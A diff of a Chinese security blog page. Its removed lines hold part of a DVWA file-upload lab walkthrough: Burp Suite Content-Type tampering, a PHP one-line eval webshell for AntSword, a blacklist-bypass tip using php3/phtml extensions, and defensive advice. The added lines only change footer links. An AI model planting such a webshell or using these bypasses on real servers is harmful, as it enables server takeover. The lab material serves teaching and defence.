&#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            echo <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            echo <span class="string">&quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        echo <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>利用burpsuite抓包<br><img src="https://img-blog.csdnimg.cn/20210527093950860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>修改Content-Type为jepg.jpg,然后利用蚁剑链接url上传webshell<br>编写一句话木马</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;xie&#x27;</span>]);  ?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210527174213373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210527101023251.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p> 1、文件上传的目录设置为不可执行<br>只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，因此这一点至关重要。<br>2、判断文件类型<br>在判断文件类型时，可以结合使用MIME Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。<br>3、使用随机数改写文件名和文件路径<br>文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。<br>4、单独设置文件服务器的域名<br>由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。</p>
-<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p>$_FILES变量专门用于获取上传文件的各种信息。<br>$_FILES[‘uploaded’][‘namek’]，获取客户端文件的原名称;<br>$_FILES[‘uploaded’][‘tmp_name’]”，获取文件被上传后在服务端存储的临时文件名。<br>$target_path = DVWA_WEB_PAGE_TO_ROOT.”hackable/uploads/‘’;<br>指定文件上传路径为“网站根目录/hackable/uploads”<br>$target_path = $target_path.basename( $_FILES[‘uploaded’][‘name’]);指定上传之后的文件名及保存路径</p>
-<h2 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h2><p>文件上传如何绕过黑名单：使用不常见的文件后缀名,如php3,php4,phtml,asa等</p>
-
-        </div>
-    
-
-</div>
-            
         </section>
     </div>
 </div>
@@ -577,19 +575,19 @@
         <ul>
             
             <li>
+                <a class="footer-post" href="/2021/07/25/buuctf(%E4%BA%8C)/">buuctf（二）</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2021/07/25/beef/">beef</a>
+            </li>
+            
+            <li>
                 <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/">图片隐写</a>
             </li>
             
             <li>
                 <a class="footer-post" href="/2021/07/18/%E5%9B%BE%E7%89%87%E6%9C%A8%E9%A9%AC/">图片木马的制作</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/06/20/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/">暴力破解</a>
-            </li>
-            
-            <li>
-                <a class="footer-post" href="/2021/06/19/buuctf/">buuctf</a>
             </li>
             
         </ul>
